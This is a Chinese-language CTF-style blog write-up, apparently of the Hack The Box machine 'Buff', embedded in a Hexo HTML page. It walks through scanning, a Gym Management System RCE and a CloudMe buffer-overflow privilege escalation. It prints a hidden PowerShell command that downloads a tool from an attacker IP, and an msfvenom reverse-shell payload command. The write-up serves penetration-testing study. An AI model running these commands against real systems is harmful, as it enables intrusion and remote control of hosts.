@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Buff | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="nmap scan 该机器开启了8080和7680端口 详细扫描   dirsearch   对目录进行扫描 存在upload界面和一个register界面 upload目前不允许访问 可以尝试先注册一个用户   注册界面也只允许admin进行访问  web在网页上我们可以看到这个网站是由gym management system 搭起来的尝试用searchsploit搜索尝试直接用远程代码执行获">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Buff">
+<meta property="og:url" content="http://example.com/2022/08/29/Buff/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="nmap scan 该机器开启了8080和7680端口 详细扫描   dirsearch   对目录进行扫描 存在upload界面和一个register界面 upload目前不允许访问 可以尝试先注册一个用户   注册界面也只允许admin进行访问  web在网页上我们可以看到这个网站是由gym management system 搭起来的尝试用searchsploit搜索尝试直接用远程代码执行获">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/08/29/Buff/nmap.png">
+<meta property="og:image" content="http://example.com/2022/08/29/Buff/nmap2.png">
+<meta property="og:image" content="http://example.com/2022/08/29/Buff/dir1.png">
+<meta property="og:image" content="http://example.com/2022/08/29/Buff/dir2.png">
+<meta property="og:image" content="http://example.com/2022/08/29/Buff/dir3.png">
+<meta property="og:image" content="http://example.com/2022/08/29/Buff/upload1.png">
+<meta property="og:image" content="http://example.com/2022/08/29/Buff/profile.png">
+<meta property="og:image" content="http://example.com/2022/08/29/Buff/searchsploit.png">
+<meta property="og:image" content="http://example.com/2022/08/29/Buff/upload2.png">
+<meta property="og:image" content="http://example.com/2022/08/29/Buff/smb1.png">
+<meta property="og:image" content="http://example.com/2022/08/29/Buff/nc1.png">
+<meta property="og:image" content="http://example.com/2022/08/29/Buff/nc2.png">
+<meta property="og:image" content="http://example.com/2022/08/29/Buff/netstat.png">
+<meta property="og:image" content="http://example.com/2022/08/29/Buff/cloudme.png">
+<meta property="og:image" content="http://example.com/2022/08/29/Buff/cloudme1112.png">
+<meta property="og:image" content="http://example.com/2022/08/29/Buff/chisel.png">
+<meta property="og:image" content="http://example.com/2022/08/29/Buff/payload.png">
+<meta property="og:image" content="http://example.com/2022/08/29/Buff/root.png">
+<meta property="article:published_time" content="2022-08-30T00:58:48.000Z">
+<meta property="article:modified_time" content="2022-08-30T05:17:25.771Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/08/29/Buff/nmap.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Buff" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/08/29/Buff/" class="article-date">
+  <time class="dt-published" datetime="2022-08-30T00:58:48.000Z" itemprop="datePublished">2022-08-29</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Buff
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/08/29/Buff/nmap.png">
+该机器开启了8080和7680端口
+详细扫描
+<img src="/2022/08/29/Buff/nmap2.png">
+
+<h4 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h4><img src="/2022/08/29/Buff/dir1.png">
+<img src="/2022/08/29/Buff/dir2.png">
+<img src="/2022/08/29/Buff/dir3.png">
+对目录进行扫描
+存在upload界面和一个register界面
+upload目前不允许访问
+可以尝试先注册一个用户
+<img src="/2022/08/29/Buff/upload1.png">
+<img src="/2022/08/29/Buff/profile.png">
+注册界面也只允许admin进行访问
+
+<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><p>在网页上我们可以看到这个网站是由gym management system 搭起来的<br>尝试用searchsploit搜索<br><img src="/2022/08/29/Buff/searchsploit.png"><br>尝试直接用远程代码执行<br><img src="/2022/08/29/Buff/upload2.png"><br>获得了web的权限<br>但是发现只能在该目录下活动<br>尝试一下传一个nc上去<br><img src="/2022/08/29/Buff/smb1.png"><br>开一个smb服务器上传<br><img src="/2022/08/29/Buff/nc1.png"><br><img src="/2022/08/29/Buff/nc2.png"><br>用systeminfo配合windows-exploit-suggester查看一下</p>
+<h4 id="root"><a href="#root" class="headerlink" title="root"></a>root</h4><p><code>netstat -ano | findSTR TCP | findstr &quot;:0&quot;</code><br>使用上述命令查看架在本地端口的应用<br><img src="/2022/08/29/Buff/netstat.png"><br>有一个运行在127.0.0.1上的应用<br><code>tasklist /v | findstr 2564</code><br>通过上面这条命令查看这是什么应用<br>这里有点问题，但最后找到的进程应该是cloudme.exe<br><img src="/2022/08/29/Buff/cloudme.png"><br><img src="/2022/08/29/Buff/cloudme1112.png"><br><code>powershell -w hidden -noni -nop -c &quot;(new-object System.Net.WebClient).DownloadFile(&#39;http://10.10.14.3/chisel.exe&#39;,&#39;c.exe&#39;)&quot;</code><br>用上述指令下载chisel.exe到windows上进行端口转发<br>kali上开一个简易的http服务器<br><code>python3 -m http.server 80</code><br>然后在两边进行端口映射<br><img src="/2022/08/29/Buff/chisel.png"><br>查看poc，该poc里给出了用msfvenom生成payload的方式<br><img src="/2022/08/29/Buff/payload.png"><br><code>msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.20 LPORT=443 -b &#39;\x00\x0A\x0D&#39; -f python -v payload</code><br>在本地开启nc进行监听<br><img src="/2022/08/29/Buff/root.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/08/29/Buff/" data-id="cl7fqgxhj00000tcpfbc8c7y8" data-title="Buff" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/08/30/Networked/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Networked
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/08/29/Arctic/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Arctic</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/08/30/Networked/">Networked</a>
+          </li>
+        
+          <li>
+            <a href="/2022/08/29/Buff/">Buff</a>
+          </li>
+        
+          <li>
+            <a href="/2022/08/29/Arctic/">Arctic</a>
+          </li>
+        
+          <li>
+            <a href="/2022/08/28/Devel/">Devel</a>
+          </li>
+        
+          <li>
+            <a href="/2022/07/28/oscp/">oscp</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
